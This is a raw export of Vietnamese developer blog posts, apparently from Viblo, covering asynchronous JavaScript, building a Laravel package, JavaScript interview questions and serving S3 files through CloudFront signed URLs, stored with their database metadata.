của các hàm bất đồng bộ được trả về sau đó mới thực hiện tiếp. Hàm bất đồng bộ đó phải trả về một Promise và được khai báo với từ khóa Await\n```\nfunction printNumber(number){\n  return new Promise((resolve, reject) => {\n    setTimeout(\n      () => {\n       console.log(number)\n       resolve()\n      }, \n     Math.floor(Math.random() * 100) + 1\n    )\n  })\n}\n\nasync function printAll(){\n  await printNumber(1);\n  await printNumber(2);\n  await printNumber(4);\n  await printNumber(5);\n  await printNumber(6);\n}\nprintAll();\n```\nĐến đây thì chúng ta đã thấy Asyn/Await đã giải quyết triệt để được tình trạng Callback Hell cũng như Promise Hell.\n## IV . Tổng kết\nQua một hồi luyên thuyên thì chúng ta rút ra kết luận là: Lập trình bất đồng bộ có hiệu suất tốt hơn lập trình đồng bộ. Tuy nhiên, trong nhiều trường hợp chúng ta vẫn phải thực thi các đoạn mã một cách đồng bộ. Trong JavaScript, chúng ta có ba kĩ thuật là Callback, Promise, Asyn/Await. Callback phù hợp trong các trường hợp xử lý đơn giản hơn (như đồng bộ 2, 3  hàm bất đồng bộ) vì nó dễ hiểu. Asyn/Await phù hợp cho các trường hợp phức tạp như cần đồng bộ quá nhiều hàm bất đồng bộ.<br>\n*Nguồn tham khảo*<br>\nhttps://medium.com/codebuddies/getting-to-know-asynchronous-javascript-callbacks-promises-and-async-await-17e0673281ee<br>\nhttps://eloquentjavascript.net/11_async.html	I. Đồng bộ và bất đồng bộ\n1) Khái niệm\n* Synchronous(đồng bộ) là một quy trình xử lý các công việc theo một thứ tự đã được lập sẵn. Công việc sau được bắt đầu thực hiện chỉ khi công việc thứ nhất hoàn thành. Quá trình đồng bộ là một quá trình rất phổ biến trong thực tế. Ví dụ dây chuyền sản xuất sản phẩm trong các nhà máy, hay lộ trình học tập của một học sinh từ lớp 1 đến lớp 12, …\n  Trong lập...	{https://images.viblo.asia/2bd68baa-d7db-4b81-86f1-5280fb89eccc.png,https://images.viblo.asia/0f44c12e-bfa3-4904-8795-8a824ebf0dbb.png,https://images.viblo.asia/4f5918b4-39b4-4887-807c-ac734fa0061e.png}	1	Xử lý bất đồng bộ trong JavaScript	{javascript,asynchronous}	0	f	2022-12-18 15:33:37.511+00	2022-12-18 15:33:37.511+00
31944	Hiện nay, Laravel là một framework PHP được rất nhiều công ty sử dụng để triển khai các dự án. Khi thực hiện một chức năng trong ứng dụng laravel có nhiều chức năng ở trong nhiều dự án khác nhau. Vậy nên để sử dụng lại các chức năng đó chúng ta tạo một package, khi cần sử dụng chúng ta chỉ cần require vào ứng dụng laravel của mình. Vậy để làm sao để tạo và publish một package? Cùng mình tìm hiểu trong bài viết này nhé. Bắt đầu nào :D\n## Cài đặt project Laravel\nVì một package được tạo để thêm chức năng bổ sung cho ứng dụng Laravel của chúng ta, nên điều đầu tiên chúng ta cần làm là cài đặt project Laravel. Cách đơn giản nhất là:\n```\ncomposer create-project --prefer-dist laravel/laravel demoPackage\n```\n## Cấu trúc thư mục\nTiếp theo, Chúng ta tạo một thư mục packages để chứa package trong thư mục gốc ứng dụng của chúng ta. Quy ước đặt tên package sẽ như sau:\n```\nCreator or vendor/package name\n```\nVí dụ: Như package `spatie/laravel-fractal` thì `spatie` là tên người tạo, `laravel-fractal` là tên package\n<br>\nTương tự như thế, mình sẽ đặt tên package của mình như sau `lyhuynh/firstpackage`. Tạo thư mục bên trong thư mục `packages` mà chúng ta đã tạo, cấu trúc sẽ như sau:\n```\n- packages\n    - lyhuynh\n        - firstpackage\n```\nChúng ta sẽ tạo thêm một thư mục `src`:\n```\n- packages\n    - lyhuynh\n        - firstpackage\n            - src\n```\n## Tạo file composer\nMỗi package nên có một tệp `composer.json`, một tệp sẽ chứa tất cả các `packages` và các `dependencies` của chúng. Bên trong thư mục `firstpackage` chúng ta chạy lệnh sau:\n```\ncomposer init\n```\nTrên terminal sẽ hiển thị để chúng ta nhập các thông tin về package. Các bạn có thể bỏ qua phần này bằng cách ấn phím enter và nó sẽ lấy các giá trị mặc định, các bạn có thể thay đổi thông tin này trong file `composer.json`, nội dung file sau khi chúng ta tạo:\n```\n{\n    "name": "lyhuynh/firstpackage",\n    "authors": [\n        {\n            "name": "phanlyhuynh",\n            "email": "lyhuynh@gmail.com"\n        }\n    ],\n    "require": {}\n}\n```\nTrong `composer.json` của chúng ta, chúng ta cần yêu cầu nó tự động tải các tệp của chúng ta, thêm vào `composer.json` đoạn code dưới đây:\n```\n "autoload": {\n            "psr-4": {\n                "lyhuynh\\\\firstpackage\\\\": "src/"\n            }\n        }\n```\nLúc đó nội dung file composer.json của chúng ta sẽ như sau:\n```\n{\n    "name": "lyhuynh/firstpackage",\n    "authors": [\n        {\n            "name": "phanlyhuynh",\n            "email": "lyhuynh0806@gmail.com"\n        }\n    ],\n    "require": {},\n    "autoload": {\n        "psr-4": {\n            "lyhuynh\\\\firstpackage\\\\": "src/"\n        }\n    }\n}\n```\n## Tạo service provider cho package\nService provider là điểm truy cập vào package của chúng ta. Đây là nơi duy trì tất cả các thông tin liên quan đến package của chúng ta, chẳng hạn như vị trí của views, migration, routes,... được load Bạn có thể đọc thêm về service provider trong tài liệu chính thức của Laravel.\n<br>\nTrong thư mục src bên trong thư mục`packages`, chúng ta tạo file `FirstPackageServiceProvider.php`:\n```\n- packages\n    - lyhuynh\n        - firstpackage\n            - src\n                - FirstPackageServiceProvider.php\n            - composer.json\n```\nMột số điều chúng ta cần quan tâm về service provider ở đây là:\n1. Namespace\n2. Hai phương thức bắt buộc mà mọi service provider phải có (mỗi service provider  gói Laravel phải có ít nhất hai phương thức: boot () và register ()).\n<br>\nNội dung file service provider sẽ như sau:\n```php\n<?php\nnamespace lyhuynh\\firstpackage;\n\nuse Illuminate\\Support\\ServiceProvider;\n\nclass ContactFormServiceProvider extends ServiceProvider {\n    public function boot()\n    {\n\n    }\n    public function register()\n    {\n\n    }\n}\n```\nTrước khi chúng ta `boot` hoặc `register` package của chúng ta, chúng ta cần cung cấp service provider của chúng ta trong `config/app.php`:\n```php\n'providers' => [\n    /*\n         * Application Service Providers...\n         */\n         \n        App\\Providers\\RouteServiceProvider::class,\n        lyhuynh\\firstpackage\\FirstPackageServiceProvider::class,\n]\n```\n## Load package từ file composer của ứng dụng laravel\nVì chúng ta chưa triển khai package của chúng ta và nó chưa nằm trong thư mục vendor nên chúng ta cần cho laravel biết cách tải package của chúng ta như thế nào và sử dụng các chức năng của nó. Vì vậy, bên trong ứng dụng laravel của chúng ta file `composer.json` sẽ thêm dòng sau:\n```\n"autoload": {\n        "psr-4": {\n            "App\\\\": "app/",\n            "lyhuynh\\\\firstpackage\\\\": "packages/lyhuynh/firstpackage/src/"\n        },\n        "classmap": [\n            "database/seeds",\n            "database/factories"\n        ]\n    },\n    "autoload-dev": {\n        "psr-4": {\n            "Tests\\\\": "tests/",\n            "lyhuynh\\\\firstpackage\\\\": "packages/lyhuynh/firstpackage/src/"\n        }\n    },\n```\nSau đó, trên terminaltrong thư mục gốc của ứng dụng laravel của chúng ta chạy:\n```\ncomposer dump-autoload\n```\n## Tạo thư mục resources, Models, Http, Database, routes trong package\nTrong thư mục src của package chúng ta tạo các thư mục views, models, controller, migration, routes, cấu truc thư mục sẽ như sau:\n```\n- packages\n    - lyhuynh\n        - firstpackage\n            - src\n                - Database\n                    - migration\n                - Http\n                    - controllers\n                - Models\n                - resources\n                    - views\n                - routes\n                - FirstPackageServiceProvider.php\n            - composer.json\n```\n## Lời kết\nTrong bài viết này, mình đã giới thiệu qua về cấu trúc thư mục, các thư mục và các file cần thiết để tạo một package, trong bài viết sau [Tạo một package Laravel như thế nào? (P2)](https://viblo.asia/p/tao-mot-package-laravel-nhu-the-nao-p2-google-webhook-calendar-YWOZrarwKQ0) mình sẽ cùng các bạn tạo một package :D Cảm ơn các bạn đã theo dõi bài viết	Hiện nay, Laravel là một framework PHP được rất nhiều công ty sử dụng để triển khai các dự án. Khi thực hiện một chức năng trong ứng dụng laravel có nhiều chức năng ở trong nhiều dự án khác nhau. Vậy nên để sử dụng lại các chức năng đó chúng ta tạo một package, khi cần sử dụng chúng ta chỉ cần require vào ứng dụng laravel của mình. Vậy để làm sao để tạo và publish một package? Cùng mình tìm hiể...	{}	1	Tạo một package Laravel như thế nào? (P1)	{laravel,package-laravel}	0	f	2022-12-18 15:33:38.004+00	2022-12-18 15:33:38.004+00
32040	Theo một cuộc điều tra cách mạng ẩn danh mà mình tìm hiểu được thì trong cuộc sống có 2 thứ khó hiểu nhất. Đối với nam giới thì đó là phụ nữ, còn đối với lập trình viên thì đó hẳn là javascript rồi. \n![](https://images.viblo.asia/79b2de9b-0518-4bc9-8a41-9252ebd25b55.png)\nJavascript là ngôn ngữ không thể thiếu trong thời đại hiện nay. Dù bạn có học ngôn ngữ gì đi chăng nữa thì bạn vẫn cần phải biết về javascript. Hôm nay mình xin chia sẻ một chút kiến thức về javascript, cũng không có gì cao siêu cả, nếu không muốn nói là khá tù. Bài viết này mình viết với mục đích dành cho các bạn Intern, Fresher trong quá trình đi phỏng vấn có thể tham khảo vì đây là những câu hỏi liên quan đến javascript mà rất dễ bị "sờ gáy".  Bắt đầu nào. Mại zô...\n\n![](https://images.viblo.asia/e843f0b1-070f-4c2e-af5a-ba3dcdbeb47f.jpeg)\n### 1. Javascript là gì?\n> Trả lời: Javascript là một ngôn ngữ lập trình kịch bản dựa vào đối tượng phát triển có sẵn hoặc tự định nghĩa ra, javascript được sử dụng rộng rãi trong các ứng dụng Website. Nó là một ngôn ngữ **thông dịch**.\n### 2. Các kiểu dữ liệu trong Javascript?\n> Trả lời: Có 6 kiểu đó là **String**, **Number**, **Object**, **Undefined**, **Boolean**, **Array**, **Null**\n\nVí dụ: \n```js\n// String\nvar a = 'viblo';\n// Number\nvar b = 3;\n// Object\nvar c = { a: 1, b: '2' }\n// Undefined\nvar d;\n// Boolean\nvar e = 10 < 11;\n// Array\nvar f = [1, 2, 3, 'z'];\n```\n### 3. Hàm delete có chức năng gì?\n> Trả lời: Hàm delete  loại bỏ một thuộc tính khỏi object; nếu không tồn tại tham chiếu tới thuộc tính, nó sẽ tự động giải phóng.\n\nVí dụ:\n```js\nvar user = { name: 'Vu', age: 18 };\ndelete user.age;\nconsole.log(user)\n\n// => { name: 'Vu' }\n```\n\n### 4. Phân biệt var, let và const?\n> Trả lời:<br> **const** dùng để khai báo một hằng số - là một giá trị không thay đổi được trong suốt quá trình chạy.<br>**let** tạo ra một biến chỉ có thể truy cập được trong block bao quanh nó<br> **var** - tạo ra một biến có phạm vi truy cập xuyên suốt function chứa nó.\n> \nVí dụ: \n```js\n// let\nif (true) {\n  let text = 'in if statement'\n}\n \nconsole.log(text) // undefinded\n\n//const\nconst a = 'vu';\na = 'nguyen'; // Lỗi Identifier 'a' has already been declared\n\n// var\nvar a = 'viblo';\nif (true) {\n  var a = 'viblo.asia';\n  console.log(a); // 'viblo.asia'\n}\nconsole.log(a); // 'viblo.asia'\n```\n\n### 5. Strict mode trong javascript là gì?\n> Trả lời: Strict theo nghĩa tiếng Việt là "nghiêm khắc". Strict Mode là một quy mẫu nghiêm khắc trong Javascript. Nếu như việc viết code bình thường là Normal mode, thì Strict Mode sẽ có thêm các quy định khác so với Normal mode.\n\nVí dụ:\n```js\n"use strict";\nfunction foo(){\n    var bar = 'viblo';\n    return bar;\n}\n\n// Uncaught ReferenceError: bar is not defined\nbar = 'asia';\n```\n\n### 6. this trong javascript là gì?\n> Trả lời: Từ khóa **this** dùng để chỉ **đối tượng** từ **nơi nó được gọi**.\n\nVí dụ:\n```js\nvar data = {\n  name: "vu",\n  age: 18,\n  getName: function(){\n      return this.name; // this = data;\n  }\n};\n\nconsole.log(data.getName()) // 'vu'\n```\n\n### 7. Khác nhau giữa undefined và null trong javascript?\n> Trả lời: Khi tạo ra một biến mà không gán giá trị thì nó sẽ là **undefined**. Còn null là một object\n\nVí dụ:\n```js\nvar a;\nconsole.log(typeof a) // undefined\nconsole.log(typeof null) // object\n```\n\n### 8. == và === khác nhau như thế nào?\n> Trả lời: Toán tử == kiểm tra tính bằng nhau, còn === kiểm tra cả tính bằng nhau và cả kiểu dữ liệu\n\nVí dụ:\n```js\nvar number1 = 1;\nvar number2 = '1';\n\nconsole.log(number1 == number2) // true\nconsole.log(number1 === number2) // false\n```\n\n### 9. Thay đổi style/class của element?\n> Trả lời: Sử dụng thuộc tính **document** trong javascript. Có thể sử dụng với id, class hay bất cứ element nào. \n\nVí dụ:\n```js\ndocument.getElementById("myId").style.backgroundColor = "red";\ndocument.getElementById("myId").className = "newclass";\ndocument.getElementByClass("myClass").className = "newclass";\ndocument.getElementByTagsName("myTagsName").className = "newclass";\n```\n### 10. Tại sao Math.max() nhỏ hơn Math.min() ?\n> Trả lời: Khi chạy code Math.max() > Math.min(), giá trị trả về là False, nghe có vẻ không hợp lý. Tuy nhiên, nếu không có tham số nào được truyền vào, Math.min() trả về Infinity và Math.max() trả về -Infinity. Vậy nên Math.max() < Math.min().\n\nVí dụ: \n```js\nvar infinity = 5\n\nvar value1 = Math.min(1)\nvar value2 = Math.min(1, infinity)\nvar value3 = Math.min(1, -infinity)\n\nconsole.log(value1) // 1\nconsole.log(value2) // 1\nconsole.log(value3) // -5\n```\n### 11. Closure trong javascript là gì?\n> Trả lời: Closure là một hàm bên trong, truy cập đến các giá trị bên ngoài phạm vi của nó. Closure có thể truy cập vào các biến trong phạm vi của riêng nó (Variables in their own scope), trong hàm (Variables in the function’s scope), và biến toàn cục (Global variables).\n\nVí dụ:\n```js\nconst arr = [1, 2, 3, 4];\n\nfor (var i = 0; i < arr.length; i++) {\n  setTimeout(function() {\n    console.log(i);\n  }, 10);\n}\n\n// 4 4 4 4\n```\n\n> Lý do là bởi vì hàm setTimeout sẽ tạo ra 1 function (closure) có thể truy cập phạm vi bên ngoài nó, vòng loop sẽ chứa index i. Sau 10ms, hàm được thực thi và nó sẽ log ra giá trị của i, là giá trị cuối cùng của vòng lặp (4).\n\n### 12. Hoisting trong javascript là gì?\n> Trả lời: Hoisting là hành động mặc định của Javascript, nó sẽ chuyển phần khai báo lên phía trên top Trong Javascript, một biến (variable) có thể được khai báo sau khi được sử dụng.\n\nVí dụ:\n```js\na = 'https://viblo.asia';\nconsole.log("My website: ", a); // My website: https://viblo.asia\nvar domain;\nconsole.log("My website: ", a); //  // My website: https://viblo.asia\n```\n\n### 13. Phân biệt giữa Function Declaration và Function Expression\n> Trả lời: **Function declaration** sẽ sử dụng từ khóa **function** rồi đến tên hàm. Còn **Function expression** sẽ được bắt đầu với từ khóa var, const, hoặc let.\n\nVí dụ:\n```js\n// Function Declaration:\nfunction a(x,y,z) {\n    // code here\n}\n\n// Function Expression\nconst a = function(x,y,z) {\n    // code here\n}\n```\n\n### 14. Hàm Array.splice() và hàm Array.slice() khác nhau như thế nào ?\n> Trả lời: Hàm **Array.splice()** sẽ thay thế một hoặc một số phần tử của mảng bằng một hoặc một số phần tử khác. Trong khi hàm **Array.slice()** sẽ trích xuất một số phần tử của mảng, vị trí bắt đầu và kết thúc việc trích xuất sẽ được xác định bởi tham số truyền vào hàm. Lưu ý hàm sẽ trích xuất không bao gồm phần tử end truyền vào.\n\nVí dụ:\n```js\n// Array.splice()\nvar language = ["php", "css", "html", "js"];\nlanguage.splice(1, 1, "python", "c#", "ios");\nconsole.log(language) // ['php', 'python', 'c#', 'ios', 'html', 'js'];\n// Array.slice()\nvar language = ["html", "js", "php", "c#", "python", "androi", "ios"];\nvar slice = language.slice(1, 4);\nconsole.log(slice); // ['js(1)', 'php(2)', 'c#(3)']\n```\n### 15. Spead Operator trong javascript ?\n> Trả lời: Spead operator là một biểu thức mở rộng giúp gộp các phần tử vào trong một cách viết ngắn gọn hơn. Cách viết này được thể hiện bằng dấu `...`\n\nVí dụ:\n```js\nvar topLane = ['zed', 'akali'];\nvar all = ['yasuo', 'rengar', ...topLane, 'đan trường'];\nconsole.log(all) //  ['yasuo', 'rengar', 'zed', 'akali', 'đan trường']\n```\n\n### 16. Anonymous function là gì ?\n> Trả lời: Là một hàm ẩn danh, không có tên gọi, thường được sử dụng khi xử lý các công việc có quy mô nhỏ, vì thế không cần thiết phải khởi tạo tên định danh cho hàm này. Giúp nó có tốc độ xử lý nhanh hơn hàm truyền thống phải có tên định danh.\n\nVí dụ:\n```js\nvar anonymous = function(a, b) {\n    return a + b;\n};\nconsole.log(anonymous(5, 10)); // 15\n//Anonymous Function không có đối số\nvar anonymous = function() {\n    return "Hello World";\n};\nconsole.log(anonymous()); // Hello World\n\n(function(){\n    console.log('viblo');\n}).call(this) // viblo\n```\n\n### 17. Tại sao 0.1  + 0.2 không bằng 0.3 ? \n> Trả lời: Vấn đề này liên quan đến việc Javascript lưu trữ dữ liệu float ở dạng nhị phân chính xác tới từng con số sau dấu phẩy. Hơn nữa  máy tính không thể biểu diễn chính xác số thập phân, nên gây ra sai số kiểu này.<br>Giải pháp ở đây có thể sử dụng hàm toFixed() để đạt được kết quả đúng.\n\n```js\nconsole.log(0.1 + 0.2) //0.30000000000000004\n\n// Sử dụng toFixed()\nvar number = 0.1 + 0.2;\nconsole.log(number.toFixed(2)) // 0.3\n```\n\n### 18. Sự khác nhau giữa window.onload và onDocumentReady ?\n> Trả lời: Sự kiện **window.onload** có ý nghĩa rằng khi trình duyệt đã load xong mọi thứ (image, js, css) thì những đoạn code nằm bên trong đó mới được chạy. Với **onDocumentReady**, mọi thứ bên trong hàm này sẽ được load ngay khi DOM được load và trước khi toàn bộ nội dung bên ngoài được load.\n\n### 19. Kết quả của 1 + 2 + '3' ?\n> Trả lời: 33. 1 và 2 là kiểu integer, khi cộng lại sẽ được 3, sau đó sẽ nối với string '3' để được kết quả là 33.\n\n### 20. Promise trong javascript là gì ?\n> Trả lời: Promise là một cơ chế trong JavaScript giúp bạn thực thi các tác vụ bất đồng bộ mà không rơi vào callback hell hay pyramid of doom, là tình trạng các hàm callback lồng vào nhau ở quá nhiều tầng. Có 3 trạng thái: **pending**, **fulfilled**, **reject**.\n\nHi vọng sau khi đọc xong bài này các bạn có thể nhớ thêm, học thêm 1 chút gì đó về javascript. Mong có thể giúp ích cho các bạn.\nHẹn gặp lại các bạn ở bài viết tiếp theo. \n\n![](https://images.viblo.asia/7ecd1943-b49b-455c-b1f9-00e968ac8139.gif)\nTài liệu tham khảo:\n- https://medium.com/@bretcameron/9-javascript-interview-questions-48416366852b\n- https://www.gangboard.com/blog/javascript-interview-questions-and-answers/	Theo một cuộc điều tra cách mạng ẩn danh mà mình tìm hiểu được thì trong cuộc sống có 2 thứ khó hiểu nhất. Đối với nam giới thì đó là phụ nữ, còn đối với lập trình viên thì đó hẳn là javascript rồi.\n\nJavascript là ngôn ngữ không thể thiếu trong thời đại hiện nay. Dù bạn có học ngôn ngữ gì đi chăng nữa thì bạn vẫn cần phải biết về javascript. Hôm nay mình xin chia sẻ một chút kiến thức về javasc...	{https://images.viblo.asia/79b2de9b-0518-4bc9-8a41-9252ebd25b55.png,https://images.viblo.asia/e843f0b1-070f-4c2e-af5a-ba3dcdbeb47f.jpeg,https://images.viblo.asia/7ecd1943-b49b-455c-b1f9-00e968ac8139.gif}	1	Một vài câu hỏi về Javascript mà một Intern / Fresher cần biết khi đi phỏng vấn	{javascript}	0	f	2022-12-18 15:33:37.515+00	2022-12-18 15:33:37.515+00
32043	# Bài toán \n\nOk, hiện tại thì hệ thống mà mình đang làm đang sử dụng AWS S3 để lưu file và nội dung mà user lưu trữ. Cho đến một ngày đẹp trời, khách hàng tự dưng có yêu cầu: Chuyển việc trích xuất và lấy các tài nguyên lưu trên S3 đó - thay vì lấy trực tiếp từ S3 - thì sẽ chuyển sang lấy thông qua CloudFront. Tất nhiên là họ cũng có lý do:\n- Khách hàng có phát triển một app, trong đó có nhúng WebView để hiện thị trang web mình đang làm; tình cờ là app đó cũng có chức năng giới hạn domain, website mà client có thể truy cập => Thay vì cho domain của S3 vào whitelist, họ lại muốn sử dụng CloudFront để chuyển domain về cùng với hệ thống asset cũ của họ :|\n- Tận dụng được lợi ích của 1 CDN (giảm thiểu chi phí request tới S3 , tăng tốc độ tải tài nguyên nhờ vào caching ... bla bla bla)\n\n:|\n\n...\n\nOk, làm thôi :)\n\n## Giới thiệu\n\nBỏ qua phần giới thiệu, vì các khái niệm S3 và CloudFront - nếu các bạn đã có ý định click và đọc bài viết này - thì hẳn ít nhất bạn cũng đã nắm được chúng là rồi.\n\nCòn đối với ai thực sự chưa biết, thì có thể đến với bài giới thiệu sau:\nhttps://viblo.asia/p/amazon-s3-with-amazon-cloudfront-OeVKBxyMlkW\n\n# Thiết lập AWS cho CloudFront và S3\n\n## Khởi tạo bucket cho S3\n\nQuay lại bài toán lúc đầu, mình sẽ cần một bucket trên S3. Trong trường hợp chưa có, ta có thể tạo một cái mới. VD ở đây mình sẽ tạo một bucket S3 mới với tên `sample-s3-ntd`.\n\nĐể tạo một bucket thông qua AWS console, truy cập vào trang [S3 managament](https://console.aws.amazon.com/s3/home?region=ap-southeast-1)  và click "Create Bucket". \n\n![](https://images.viblo.asia/aa124ac1-bfec-4f6f-96e4-726c5de629ef.png)\n\nCác step tiếp theo ta có thể để mặc định; và theo mặc định thì các resource trên bucket này sẽ là private.\n\nSau khi được tạo, bucket sẽ có URL là `https://sample-s3-ntd.s3-ap-southeast-1.amazonaws.com` (Chú ý là sẽ có phần region - `ap-southeast-1` - bên trong url)\n\nLúc này, mình sẽ có thể thử upload 1 file mới vào bucket này . Có thể thấy là sẽ có 1 url tương ứng để truy cập vào file vừa được upload:\n\n![](https://images.viblo.asia/adef2040-ab70-4293-a0a6-b7fdd6e0fcc1.png)\n\nTuy nhiên, nếu thử truy cập trực tiếp vào URL kia, ta sẽ gặp error `AccessDenied`. Lý do vừa nói ở trên: bucket được tạo với setting mặc định thì các asset bên trong đều là private.\n\n![](https://images.viblo.asia/e93f8c61-ce51-44a4-beac-ba1249c7feca.png)\n\n## Tạo CloudFront Distribution\n\nStep thứ 2: Ta sẽ tạo 1 cái Distribution mới cho CloudFront !\n\nTương tự với S3, ta có thể quản lý CloudFront thông qua trang [CloudFront Management](https://console.aws.amazon.com/cloudfront/home?region=ap-southeast-1#). Ở trang này, tạo một distrubtion băng cách click vào `Create Distribution`\n\n1. Ở bước đầu tiên, chọn `Web` thay cho `RTMP`.\n\n2. Ở bước thứ 2 - `Origin settings` - sẽ có một số setting ta cần quan tâm đến:\n- **Origin domain name**: đây là địa chỉ domain của S3 bucket (chú ý là domain ở đây bao gồm cả region) - như bucket của mình thì sẽ là \n`sample-s3-ntd.s3-ap-southeast-1.amazonaws.com`\n- **Origin Path**: Một distribution thực ra có thể kết nối tới nhiều origin, nhưng trong bài này thì ta chỉ cần 1 origin thôi, nên có thể dùng mặc định do AWS tự sinh ra cũng được.\n- **Restrict Bucket Access**: `Yes`.\n- **Origin Access Identity**: Ở đây ta sẽ chọn `Create a New Identity` (ở dưới ta sẽ quay lại với option còn lại sau - `Use an Existing Identity`)\n- **Comment**: đặt tên cho cái identity tạo ở dòng trên. Mình sẽ để là `CloudFront OAI`\n- **Grant Read Permissions on Bucket**: tiếp tục chọn là `Yes, Update Bucket Policy` (option còn lại - `No, I will Update Permissions` - sẽ yêu cầu ta phải thiết lập policy cho S3 bucket bằng tay)\n- **Viewer Protocol Policy**: có thể chọn gì cũng đc, tuy nhiên vì mình thích dùng HTTPS hơn, nhưng vẫn muốn flexible một chút nên lựa chọn `Redirect HTTP to HTTPS` - cái này đọc tên các option là hiểu.\n- **Query String Forwarding and Caching**: hiện giờ thì mặc định là `None`, nhưng ta có thể quay lại với nó sau.\n- **Restrict Viewer Access (Use Signed URLs or Signed Cookies)**: cái này sẽ chọn là `Yes`\n  - Ở đây khi ta chọn Yes, thì việc truy cập để lấy được asset S3 thông qua CloudFront cũng không thể trực tiếp được, mà phải thông qua một bước tạo ra signed_url hoặc sử dụng signed cookie nữa\n- **Trusted Signers**: `Self`\n- **Alternate Domain Names (CNAMEs)**: đây chính là chỗ mà để mình thực hiện theo như yêu cầu đề bài của khách - sử dụng một custom domain để truy cập vào CloudFront.\n\n\nTạm thời như vậy, nhấn Create distribution, và uống một cốc cà phê - sẽ phải mất tầm 15 phút để cái Distribution mới được khởi tạo xong.\n\n![](https://images.viblo.asia/40f381f6-e9e2-490f-8b4c-7934125622c1.png)\n\n***\n\nXong 15 phút ! Click vào xem Distribution mới mà ta vừa tạo xong !\n\nĐể ý dòng `Domain Name` - đây là domain của Distribution này (mặc định AWS sẽ sinh ra một domain random cho ta)\n\n![](https://images.viblo.asia/829be315-5296-41b6-b1f7-9e5d6169560b.png)\n\nTa có thể sử dụng domain này để truy cập lấy tài nguyên vừa nãy vừa tạo bên S3 rồi. Nhớ lại đường link để lấy file bên S3:\n\n```\nhttps://sample-s3-ntd.s3-ap-southeast-1.amazonaws.com/07f29316d02c2f03864e94c388ed6b1834341364.jpg\n```\n\nThay domain bằng domain mới của CloudFront, ta sẽ có:\n\n```\nhttps://dezzpzhhpx122.cloudfront.net/07f29316d02c2f03864e94c388ed6b1834341364.jpg\n```\n\nTruy cập thử vào đường link này, ta sẽ tiếp tục nhận được một error khác.\n\n![](https://images.viblo.asia/ea057bd0-ef65-43b0-8179-3724046d7426.png)\n\nLý do của cái error này là ta cho lựa chọn `Restrict Viewer Access` ở phía trên. Lúc này, ta buộc phải truy cập tài nguyên của S3 thông qua việc sử dụng signed_url hoặc signed cookies của CloudFront.\n\nĐể có thể tạo được 2 cái kia, bước tiếp theo, ta cần tạo thêm 1 thứ nữa : `CloudFront Key Pair`\n\n##  Tạo CloudFront Key Pair\n\nNhư đã nói ở trên, S3 Url có thể bị giới hạn - khi đó ta buộc phải sử dụng phiên bản signed của nó - ta có thể sign 1 S3 URL bằng chính S3, hoặc sử dụng signed_url của CloudFront (cách mình sẽ trình bày tiếp ở dưới). Để tạo được cái này, ta sẽ cần 1 thứ gọi là `CloudFront Key Pair`. Tuy nhiên ...\n\n> [Important](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-trusted-signers.html#private-content-creating-cloudfront-key-pairs-procedure) - Để tạo `CloudFront Key Pair` - bắt buộc phải login vào tài khỏa root. Một tài khoản IAM user không thể tạo được CloudFront Key Pair. \n \nOk. Đăng nhập vào root user, vào trang `My Security Credentials`. Ở đây ta có thể thấy `CloudFront key pairs`. \n\nTạo một key pair mới, **nhớ phải lưu lại file private key !!**, đồng thời copy lại cái `Access Key ID` (thực ra ko copy cũng đc, cái acccesskey này chính là tên file lưu private_key)\n\n![](https://images.viblo.asia/8ce35931-4de0-4e4c-8e4f-511cbb644f95.png)\n\nGiờ ta có thể sử dụng Key Pair này để tạo signed_url được rồi.\n\n## Genarate CloudFront's signed URLs\n\nỞ bước này, AWS cung cấp rất nhiều bộ SDK cho từng ngôn ngữ một : PHP, C#, JAVA, RUBY ...\n\nỞ đây, mình sẽ demo thử bằng ngôn ngữ Ruby, với [bộ thư viện chuẩn của AWS](https://docs.aws.amazon.com/sdkforruby/api/Aws/CloudFront/UrlSigner.html)\n\n```\nsigner = Aws::CloudFront::UrlSigner.new(\n  key_pair_id: "cf-keypair-id",               # Access Key ID mình vừa tạo ra ban nãy.\n  private_key_path: "./cf_private_key.pem"    # file chứa private_key đi kèm.\n)\nurl = signer.signed_url(url, expires: Time.current.to_i + 30)\n```\n\nỞ đây ta có thể để ý thấy có param optional `expires`: Nếu thiết lập thêm param này, url được generated ra sẽ chỉ có thời gian sống  là 30 giây. Quá 30 giây, URL đó sẽ trở thành invalid.\n\nSử dụng đường link được generate ra, ta có thể xem được file rồi :)\n\n***\n\n## Ngoài lề 1: `Identity` khi tạo Distribution là gì ?\n\nVừa nãy mình có tua qua phần này 1 chút, tuy nhiên giờ ta có thể quay lại cái distribution ban nãy và nhìn lại cái này một chút.\n\n![](https://images.viblo.asia/ffd898bc-88e2-47b1-acec-17cef0e9acb6.png)\n\nĐây là màn hình edit distribution ban nãy, và ta có thể thấy là hiện thời nó đang sử dụng 1 `Identity` là `CloudFront OAI`. Đây là cái ta vừa mới tạo vừa nãy trong lúc tạo Distribution.\n\nQuay lại màn hình chính của CloudFront, để ý bên menu bên trái có một phần tên là `Origin Access Identity`\n\n![](https://images.viblo.asia/b7c43994-6843-4523-8883-8a7287d90578.png)\n\nClick vào, ta sẽ vào được trang `Origin Access Identity` của CloudFront. Khái niệm của cái này đã được ghi trong [document của AWS](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-restricting-access-to-s3.html)\n\n> To restrict access to content that you serve from Amazon S3 buckets, you create CloudFront signed URLs or signed cookies to limit access to files in your Amazon S3 bucket, and then you create a special CloudFront user called an origin access identity (OAI) and associate it with your distribution. Then you configure permissions so that CloudFront can use the OAI to access and serve files to your users, but users can't use a direct URL to the S3 bucket to access a file there. Taking these steps help you maintain secure access to the files that you serve through CloudFront.\n\n![](https://images.viblo.asia/4029640c-dfbc-4856-822d-ca69574eade8.png)\n\nTóm lại là OAI sẽ là 1 dạng user đặc biệt của CloudFront, nó sẽ có quyền truy cập vào các tài nguyên bên phía S3.\n\nVậy làm sao 1 user OAI có thể kết nối tới S3 ? \n\nQuay qua màn hình setting cho bucket bên phía S3.\n\nbên trong bucket S3, đi vào `Permissions` => `Bucket Policy`, ta sẽ thấy một cụm như sau\n\n![](https://images.viblo.asia/ea823d67-f8e6-4ae7-b628-a64aca827efa.png)\n\nỞ đây, ta sẽ thấy phần dưới này chính là phần cấp phép cho user OAI kia truy cập vào các tài nguyên S3. (Cái cụm XXXXXX kia chính là ID của user OAI phía trên)\n\n```\n{\n  "Sid": "1",\n  "Effect": "Allow",\n  "Principal": {\n    "AWS": "arn:aws:iam::cloudfront:user/CloudFront Origin Access Identity 